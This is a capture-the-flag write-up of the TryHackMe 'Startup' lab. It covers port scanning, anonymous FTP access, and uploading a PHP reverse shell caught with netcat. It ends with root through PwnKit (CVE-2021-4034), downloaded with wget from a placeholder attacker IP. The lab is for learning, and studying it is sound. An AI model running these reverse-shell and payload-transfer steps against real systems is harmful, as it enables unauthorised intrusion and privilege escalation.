# Startup — TryHackMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux

## 1. Reconnaissance

Started with an Nmap scan to identify open ports and running services.

```bash
nmap -sC -sV TARGET
```

The scan revealed three open ports:

- `21/tcp` — FTP (vsftpd 3.0.3)
- `22/tcp` — SSH (OpenSSH)
- `80/tcp` — HTTP (Apache)

FTP allowed anonymous access, so I decided to investigate it alongside the web server.

## 2. Web Enumeration

Used directory fuzzing to discover hidden paths on the web server.

```bash
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The scan revealed a directory containing files that were not linked from the main website.

I kept this directory in mind for further investigation.

## 3. FTP Enumeration

Connected to the FTP server using anonymous access.

```bash
ftp TARGET
```

The FTP server contained an image and a writable directory named `ftp`.

I downloaded the image and inspected it using tools such as `file`, `exiftool`, and `zsteg`. However, I couldn't find anything useful, so I moved on.

The writable directory was more interesting because it potentially allowed uploading files to the server.

## 4. Initial Access — PHP Reverse Shell

Since the FTP directory was writable and its contents were accessible through the web server, I decided to test whether I could execute a PHP file uploaded there.

I used the PentestMonkey PHP reverse shell and configured it with my Kali machine's VPN IP address and a listening port.

On Kali:

```bash
nc -lvnp 4444
```

Uploaded the PHP reverse shell to the writable FTP directory and triggered it by opening its corresponding URL in the browser:

```text
http://TARGET/files/ftp/shell.php
```

The server connected back to my listener, giving me an initial shell as `www-data`.

## 5. Shell Stabilization

First, I tried checking sudo permissions:

```bash
sudo -l
```

However, the shell did not have a proper TTY.

I upgraded it using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a more interactive shell for further enumeration.

## 6. SUID Enumeration

Next, I searched the filesystem for SUID binaries:

```bash
find / -type f -perm -4000 2>/dev/null
```

Among the results, I noticed `pkexec`, a SUID binary associated with Polkit.

I investigated the possibility of exploiting the PwnKit vulnerability (CVE-2021-4034).

## 7. Privilege Escalation — PwnKit

The target machine did not have the exploit locally, so I transferred it from Kali using a temporary Python HTTP server.

On Kali:

```bash
python3 -m http.server 8000
```

On the target:

```bash
wget http://ATTACKER-IP:8000/EXPLOIT
```

After transferring the exploit, I executed it on the target machine.

The exploit successfully provided a root shell.

## 8. Flags

With root access, I searched for the flag files:

```bash
find / -name user.txt -o -name root.txt 2>/dev/null
```

I accessed both flags:

- `user.txt`
- `root.txt`

## 9. What I Learned

- Combining FTP enumeration with web directory fuzzing can reveal opportunities for file upload and remote code execution.
- A writable directory becomes particularly interesting when its contents are served by a web server.
- Reverse shells may require TTY stabilization before interactive commands work properly.
- SUID enumeration can reveal potential privilege escalation paths.
- Recognizing vulnerable system binaries and transferring tools to a target are useful practical skills.

## Attack Path

```text
Nmap
  ↓
Web Directory Fuzzing
  ↓
Anonymous FTP Access
  ↓
Writable FTP Directory
  ↓
PHP Reverse Shell
  ↓
www-data Shell
  ↓
TTY Stabilization
  ↓
SUID Enumeration
  ↓
PwnKit (CVE-2021-4034)
  ↓
Root Access
  ↓
User and Root Flags
```
